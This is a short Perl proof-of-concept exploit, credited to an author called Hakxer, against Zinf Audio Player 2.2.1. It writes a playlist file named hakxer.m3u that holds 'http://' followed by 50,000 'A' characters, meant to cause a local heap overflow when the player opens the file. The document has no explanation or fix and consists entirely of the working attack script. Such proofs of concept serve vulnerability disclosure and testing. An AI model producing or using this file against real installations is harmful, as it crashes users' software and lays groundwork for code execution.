#!/usr/bin/perl
# Discovered & Written by : Hakxer
# Home : www.sec-geeks.com
# Program : http://www.zinf.org/ ../http://prdownloads.sourceforge.net/zinf/zinf-setup-2.2.1.exe
# Zinf Audio Player 2.2.1 (M3U FILE)  Local Heap Overflow

my $chars="http://"."A" x 50000;

open(MYFILE,'>>hakxer.m3u');

print MYFILE $chars;

close(MYFILE);

print " Done";
